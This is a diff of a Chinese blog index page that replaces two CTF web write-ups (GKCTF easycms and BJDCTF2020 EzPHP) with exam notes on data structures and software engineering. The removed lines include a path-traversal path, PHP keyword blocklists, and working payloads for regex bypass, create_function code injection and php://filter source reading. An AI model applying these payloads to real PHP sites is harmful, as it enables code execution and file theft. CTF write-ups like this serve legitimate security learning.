-<p>在设计-&gt;主题-&gt;导入主题</p>
-<p>但是</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406211950028.png" alt="image-20240621195039994"></p>
-<p>所以，我们要找地方，创建文件</p>
-<p>所以就是要找可以创建或者上传文件的地方对吧</p>
-<p>按照这个思路，我们可以找到</p>
-<p>设计-&gt;组件-&gt;素材库</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406211952714.png" alt="image-20240621195220695"></p>
-<p>随便上传一个txt上去</p>
-<p>之后进行编辑</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406211953189.png" alt="image-20240621195311156"></p>
-<p>现在的界面的话要更改存储路径来创建一个新文件</p>
-<p>根据上文的文件，猜测</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../../system/tmp/tfeh</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212001660.png" alt="image-20240621200101620"></p>
-<p>也就是说，我们现在有这个文件了</p>
-<p>所以我们开始猜测怎么爆flag出来</p>
-<p>根据上面的，我们猜测这个flag应该和主题有关</p>
-<p>所以我们去主题里面看看</p>
-<p>随便选择一个主题</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212004631.png" alt="image-20240621200410599"></p>
-<p>在这一行里面我们都能看到一个</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212004630.png" alt="image-20240621200438587"></p>
-<p>那就很简单了，php源码搞一手</p>
-<p>我直接cat &#x2F;flag了</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212005229.png" alt="image-20240621200508201"></p>
-<p>之后返回主题，或者在右上角的可视化编辑里面看到页面</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212005045.png" alt="image-20240621200540019"></p>
-<p>我是放在友链里，在其它板块也是可以的</p>
+            <h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><h4 id="数据元素、数据项"><a href="#数据元素、数据项" class="headerlink" title="数据元素、数据项"></a>数据元素、数据项</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409051737931.png" alt="image-20240905173704813"></p>
+<h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409051737569.png" alt="image-20240905173715535"></p>
+<h4 id="数据结构三要素"><a href="#数据结构三要素" class="headerlink" title="数据结构三要素"></a>数据结构三要素</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409051737013.png" alt="image-20240905173746939"></p>
+<h5 id="逻辑结构"><a href="#逻辑结构" class="headerlink" title="逻辑结构"></a>逻辑结构</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409051738821.png" alt="image-20240905173834783"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409051738118.png" alt="image-20240905173846023"></p>
+<h5 id="物理结构"><a href="#物理结构" class="headerlink" title="物理结构"></a>物理结构</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409051739975.png" alt="image-20240905173930940"></p>
+<h4 id="算法的五个特性"><a href="#算法的五个特性" class="headerlink" title="算法的五个特性"></a>算法的五个特性</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409051742128.png" alt="image-20240905174200015"></p>
+<h4 id="算法效率的度量"><a href="#算法效率的度量" class="headerlink" title="算法效率的度量"></a>算法效率的度量</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409051743177.png" alt="image-20240905174321147"></p>
+<h5 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409051745467.png" alt="image-20240905174527372"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409051746329.png" alt="image-20240905174644270"></p>
+<h5 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409051747008.png" alt="image-20240905174719900"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409051821205.png" alt="image-20240905182119116"></p>
+<h4 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409052048224.png" alt="image-20240905204853154"></p>
+<h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409092115631.png" alt="image-20240909211458440"></p>
+<h5 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409092115160.png" alt="image-20240909211512113"></p>
+<h5 id="性能区别"><a href="#性能区别" class="headerlink" title="性能区别"></a>性能区别</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409092116884.png" alt="image-20240909211610822"></p>
+<h5 id="插入与删除"><a href="#插入与删除" class="headerlink" title="插入与删除"></a>插入与删除</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409092116107.png" alt="image-20240909211648022"></p>
+<h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409092118954.png" alt="image-20240909211854841"></p>
+<h4 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409092119725.png" alt="image-20240909211937626"></p>
+<h5 id="循环队列"><a href="#循环队列" class="headerlink" title="循环队列"></a>循环队列</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409092256149.png" alt="image-20240909225612074"></p>
+<h4 id="串"><a href="#串" class="headerlink" title="串"></a>串</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409092257766.png" alt="image-20240909225747658"></p>
+<h5 id="串的赋值"><a href="#串的赋值" class="headerlink" title="串的赋值"></a>串的赋值</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409092259372.png" alt="image-20240909225907307"></p>
+<h5 id="串的存储结构"><a href="#串的存储结构" class="headerlink" title="串的存储结构"></a>串的存储结构</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409092259571.png" alt="image-20240909225925518"></p>
+<h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409092259811.png" alt="image-20240909225954763"></p>
+<h4 id="稀疏矩阵"><a href="#稀疏矩阵" class="headerlink" title="稀疏矩阵"></a>稀疏矩阵</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409092301555.png" alt="image-20240909230111506"></p>
+<h4 id="广义表"><a href="#广义表" class="headerlink" title="广义表"></a>广义表</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409092303632.png" alt="image-20240909230318559"></p>
+<h4 id="树"><a href="#树" class="headerlink" title="树"></a>树</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409110007743.png" alt="image-20240911000743608"></p>
+<h4 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h4><h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409110011881.png" alt="image-20240911001140855"></p>
+<h5 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h5><p>前序遍历：根、左、右</p>
+<p>中序遍历：左、根、右</p>
+<p>后序遍历：左、右、根</p>
+<h5 id="反向构造二叉树"><a href="#反向构造二叉树" class="headerlink" title="反向构造二叉树"></a>反向构造二叉树</h5><h5 id="树转二叉树"><a href="#树转二叉树" class="headerlink" title="树转二叉树"></a>树转二叉树</h5><p>左子树节点作为同届中的根节点，孩子节点往左放，兄弟节点作为新孩子节点往右放</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409110022883.png" alt="image-20240911002216837"></p>
+<h5 id="查找二叉树（二叉排序树）"><a href="#查找二叉树（二叉排序树）" class="headerlink" title="查找二叉树（二叉排序树）"></a>查找二叉树（二叉排序树）</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409110024512.png" alt="image-20240911002417393"></p>
+<h5 id="构造霍夫曼数（最优）"><a href="#构造霍夫曼数（最优）" class="headerlink" title="构造霍夫曼数（最优）"></a>构造霍夫曼数（最优）</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409110025904.png" alt="image-20240911002544800"></p>
+<p>带权路径：路径长度乘数据（叶子节点）</p>
+<p>例（答案）：</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409110027943.png" alt="image-20240911002742909"></p>
+<h5 id="线索二叉树！！！"><a href="#线索二叉树！！！" class="headerlink" title="线索二叉树！！！"></a>线索二叉树！！！</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409110029220.png" alt="image-20240911002953152"></p>
+<h5 id="平衡二叉树"><a href="#平衡二叉树" class="headerlink" title="平衡二叉树"></a>平衡二叉树</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409110030936.png" alt="image-20240911003033849"></p>
+<p>上图前两个不是平衡二叉树，后两个是</p>
+<h4 id="图"><a href="#图" class="headerlink" title="图"></a>图</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409110031129.png" alt="image-20240911003151037"></p>
+<h5 id="存储结构（邻接矩阵）"><a href="#存储结构（邻接矩阵）" class="headerlink" title="存储结构（邻接矩阵）"></a>存储结构（邻接矩阵）</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409110032419.png" alt="image-20240911003235347"></p>
+<h5 id="邻接表"><a href="#邻接表" class="headerlink" title="邻接表"></a>邻接表</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409110033314.png" alt="image-20240911003345250"></p>
+<h5 id="图的遍历"><a href="#图的遍历" class="headerlink" title="图的遍历"></a>图的遍历</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409110034057.png" alt="image-20240911003419004"></p>
+<h5 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409110034356.png" alt="image-20240911003455273"></p>
+<h5 id="最小生成树（普利姆算法）"><a href="#最小生成树（普利姆算法）" class="headerlink" title="最小生成树（普利姆算法）"></a>最小生成树（普利姆算法）</h5><p>连到了的数据成为根，搜寻所有根附近的权值，不能成环</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409110037851.png" alt="image-20240911003716809"></p>
+<h5 id="克鲁斯卡尔算法"><a href="#克鲁斯卡尔算法" class="headerlink" title="克鲁斯卡尔算法"></a>克鲁斯卡尔算法</h5><p>先连接所有最小的权值，不管是否连接，最后在考虑连接问题</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409110039385.png" alt="image-20240911003944345"></p>
+<h4 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409120006558.png" alt="image-20240912000649359"></p>
+<p> <img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409120014670.png" alt="image-20240912001436633"></p>
+<h5 id="顺序查找"><a href="#顺序查找" class="headerlink" title="顺序查找"></a>顺序查找</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409120014899.png" alt="image-20240912001453804"></p>
+<h5 id="折半查找"><a href="#折半查找" class="headerlink" title="折半查找"></a>折半查找</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409120015684.png" alt="image-20240912001528625"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409120016766.png" alt="image-20240912001653718"></p>
+<h5 id="分块查找"><a href="#分块查找" class="headerlink" title="分块查找"></a>分块查找</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409120017675.png" alt="image-20240912001712573"></p>
+<h5 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409120017065.png" alt="image-20240912001751968"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409120018987.png" alt="image-20240912001821954"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409120018390.png" alt="image-20240912001843363"></p>
+<h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409120019073.png" alt="image-20240912001913966"></p>
+<h5 id="直接插入排序"><a href="#直接插入排序" class="headerlink" title="直接插入排序"></a>直接插入排序</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409120020662.png" alt="image-20240912002010559"></p>
+<h5 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409120021414.png" alt="image-20240912002117332"></p>
+<h5 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409120025865.png" alt="image-20240912002526756"></p>
+<h5 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409120026320.png" alt="image-20240912002626235"></p>
+<h5 id="简单选择排序"><a href="#简单选择排序" class="headerlink" title="简单选择排序"></a>简单选择排序</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409120027375.png" alt="image-20240912002733290"></p>
+<h5 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409120028801.png" alt="image-20240912002819730"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409120029118.png" alt="image-20240912002916054"></p>
+<h5 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409120030491.png" alt="image-20240912003037419"></p>
+<h5 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409120031277.png" alt="image-20240912003106200"></p>
+<h5 id="评价指标"><a href="#评价指标" class="headerlink" title="评价指标"></a>评价指标</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409120032988.png" alt="image-20240912003236931"></p>
 
             
         </div>
@@ -369,12 +436,12 @@
         
         
     </div>
-    <a href="/2024/06/21/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/GKCTF-2021-easycms/" class="go-post">阅读全文</a>
+    <a href="/2024/10/23/%E8%BD%AF%E8%80%83/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
-    <a href="/2024/06/20/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/BJDCTF2020-EzPHP/">
-        <h2 class="post-title">[BJDCTF2020]EzPHP</h2>
+    <a href="/2024/10/23/%E8%BD%AF%E8%80%83/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
+        <h2 class="post-title"></h2>
     </a>
     <div class="category-and-date">
         
@@ -382,7 +449,7 @@
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2024/6/20
+            2024/10/23
         </span>
         
         
@@ -390,69 +457,50 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p>查看源代码</p>
-<p>发现</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202042149.png" alt="image-20240620204218107"></p>
-<p>base32解码，得1nD3x.php</p>
-<p>访问，得到一长串代码，分开来一个个读（因为很像一关关闯关）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($_SERVER) &#123; </span><br><span class="line">  if (</span><br><span class="line">    preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;])</span><br><span class="line">    ) </span><br><span class="line">    die(&#x27;You seem to want to do something bad?&#x27;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>啊，基本上全部ban掉了啊</p>
-<p>怎么办…</p>
-<p>在这里我们可以将要上传的东西进行url编码，因为$_SERVER[‘QUERY_STRING’]不会解码url</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (!preg_match(&#x27;/http|https/i&#x27;, $_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123; </span><br><span class="line">        $file = $_GET[&quot;file&quot;]; </span><br><span class="line">        echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; else die(&#x27;fxck you! What do you want to do ?!&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p>之后就是要上传debu，满足debu的值为**&#x2F;^aqua_is_cute$&#x2F;<strong>，但是不能强等于</strong>aqua_is_cute**所以我们可以采用%0a换行符进行绕过，同时url绕过黑名单，所以payload如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb%75=aq%75a_is_c%75te%0a//%75=u</span><br></pre></td></tr></table></figure>
-
-<p>之后</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($_REQUEST) &#123; </span><br><span class="line">    foreach($_REQUEST as $value) &#123; </span><br><span class="line">        if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))  </span><br><span class="line">            die(&#x27;fxck you! I hate English!&#x27;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>$_REQUEST也就是说我们可以传get和post，同时，post优先级高于get，所以可以在个体传入之后用post覆盖</p>
-<p>该阶段payload如下：</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202051044.png" alt="image-20240620205138007"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;)</span><br><span class="line">    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>也就是说要能读取到debu_debu_aqua</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=data://text/plain.deb%75_deb%75_aq%75a</span><br></pre></td></tr></table></figure>
-
-<p>所以用data伪协议写进去就好</p>
-<p>payload:</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202102099.png" alt="image-20240620210212072"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[&quot;flag&quot;]);</span><br><span class="line">    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    die(&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>强比较，可以用数组绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh%61na[]=1&amp;p%61sswd[]=2</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || </span><br><span class="line">preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;, $arg) ) &#123; </span><br><span class="line">    die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); </span><br><span class="line">&#125; else &#123; </span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    $code(&#x27;&#x27;, $arg);</span><br><span class="line">&#125; ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这里存在**create_function()<strong>注入，而</strong>create_function()**存在两个参数$args和$code。</p>
-<p>所以这里我们保证code传入create_function</p>
-<p>之后是arg参数</p>
-<p>可以使用get_defined_vars()输出所有变量，payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fl%61g[c%6de]=create_function&amp;fl%61g[%61rg]=&#125;var_dump(get_defined_vars());//</span><br></pre></td></tr></table></figure>
-
-<p>所以总payload为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?deb%75=aq%75a_is_c%75te%0a</span><br><span class="line">&amp;file=data://text/plain,deb%75_deb%75_aq%75a</span><br><span class="line">&amp;sh%61na[]=1&amp;p%61sswd[]=2</span><br><span class="line">&amp;fl%61g[c%6fde]=create_function</span><br><span class="line">&amp;fl%61g[%61rg]=&#125;var_dump(get_defined_vars());//</span><br></pre></td></tr></table></figure>
-
-<p>发现</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202109204.png"></p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202109193.png" alt="屏幕截图 2024-06-20 210915"></p>
-<p>重点在最后一句话</p>
-<p><strong>[“ffffffff11111114ggggg”]&#x3D;&gt; string(89) “Baka, do you think it’s so easy to get my flag? I hid the real flag in rea1fl4g.php 23333”</strong></p>
-<p>也就是说，flag在rea1fl4g.php</p>
-<p>访问一下</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202111541.png" alt="image-20240620211146512"></p>
-<p>尝试一下伪协议读取源码放在arg中进行读取</p>
-<p>因为之前过滤太多了，这里直接取反</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=rea1fl4g.php</span><br><span class="line">-&gt;</span><br><span class="line">%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F</span><br></pre></td></tr></table></figure>
-
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fl%61g[%61rg]=&#125;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202118606.png" alt="image-20240620211836564"></p>
-<p>base64解码得flag</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202120490.png"></p>
+            <h3 id="软件工程基础知识"><a href="#软件工程基础知识" class="headerlink" title="软件工程基础知识"></a>软件工程基础知识</h3><h4 id="软件工程概述"><a href="#软件工程概述" class="headerlink" title="软件工程概述"></a>软件工程概述</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410162352655.png" alt="image-20241011211519071"></p>
+<h5 id="能力成熟度模型"><a href="#能力成熟度模型" class="headerlink" title="能力成熟度模型"></a>能力成熟度模型</h5><h5 id="cmm"><a href="#cmm" class="headerlink" title="cmm"></a>cmm</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410162352656.png" alt="image-20241011211724471"></p>
+<h5 id="cmmi"><a href="#cmmi" class="headerlink" title="cmmi"></a>cmmi</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410162352657.png" alt="image-20241011211750883"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410162352658.png" alt="image-20241011211805976"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410162352659.png" alt="image-20241011211901382"></p>
+<h5 id="统一过程模型"><a href="#统一过程模型" class="headerlink" title="统一过程模型"></a>统一过程模型</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410162352660.png" alt="image-20241011211933228"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410162352661.png" alt="image-20241011212020070"></p>
+<h4 id="软件开发模型"><a href="#软件开发模型" class="headerlink" title="软件开发模型"></a>软件开发模型</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410162352662.png" alt="image-20241011212108204"></p>
+<h5 id="瀑布模型"><a href="#瀑布模型" class="headerlink" title="瀑布模型"></a>瀑布模型</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410162352663.png" alt="image-20241011212151720"></p>
+<h5 id="演化模型（主要用于对于软件需求缺乏准确认识）"><a href="#演化模型（主要用于对于软件需求缺乏准确认识）" class="headerlink" title="演化模型（主要用于对于软件需求缺乏准确认识）"></a>演化模型（主要用于对于软件需求缺乏准确认识）</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410162352664.png" alt="image-20241011212256462"></p>
+<h5 id="增量模型（引入增量包）"><a href="#增量模型（引入增量包）" class="headerlink" title="增量模型（引入增量包）"></a>增量模型（引入增量包）</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410162352666.png" alt="image-20241011212344674"></p>
+<h5 id="螺旋模型（增加风险分析）"><a href="#螺旋模型（增加风险分析）" class="headerlink" title="螺旋模型（增加风险分析）"></a>螺旋模型（增加风险分析）</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410162352667.png" alt="image-20241016234809137"></p>
+<h5 id="演化模型"><a href="#演化模型" class="headerlink" title="演化模型"></a>演化模型</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410162352668.png" alt="image-20241016234929116"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410162352669.png" alt="image-20241016234951707"></p>
+<p>以上圆形模型，增量模型，螺旋模型</p>
+<h5 id="V模型（瀑布变体）"><a href="#V模型（瀑布变体）" class="headerlink" title="V模型（瀑布变体）"></a>V模型（瀑布变体）</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410162352670.png" alt="image-20241016235050467"></p>
+<h5 id="喷泉模型（面向对象，迭代和无间隙）"><a href="#喷泉模型（面向对象，迭代和无间隙）" class="headerlink" title="喷泉模型（面向对象，迭代和无间隙）"></a>喷泉模型（面向对象，迭代和无间隙）</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410162352671.png" alt="image-20241016235127112"></p>
+<h5 id="基于构件的开发模型（迭代方式构建软件）"><a href="#基于构件的开发模型（迭代方式构建软件）" class="headerlink" title="基于构件的开发模型（迭代方式构建软件）"></a>基于构件的开发模型（迭代方式构建软件）</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410162354913.png" alt="image-20241016235403790"></p>
+<h4 id="软件开发方法"><a href="#软件开发方法" class="headerlink" title="软件开发方法"></a>软件开发方法</h4><h5 id="结构化方法"><a href="#结构化方法" class="headerlink" title="结构化方法"></a>结构化方法</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410162357476.png" alt="image-20241016235701386"></p>
+<h5 id="Jackson方法"><a href="#Jackson方法" class="headerlink" title="Jackson方法"></a>Jackson方法</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410162358758.png" alt="image-20241016235806669"></p>
+<h5 id="原型化方法"><a href="#原型化方法" class="headerlink" title="原型化方法"></a>原型化方法</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410162358723.png" alt="image-20241016235847658"></p>
+<h5 id="面向对象方法"><a href="#面向对象方法" class="headerlink" title="面向对象方法"></a>面向对象方法</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410162359904.png" alt="image-20241016235927799"></p>
+<h5 id="敏捷开发方法"><a href="#敏捷开发方法" class="headerlink" title="敏捷开发方法"></a>敏捷开发方法</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410170000610.png" alt="image-20241017000017507"></p>
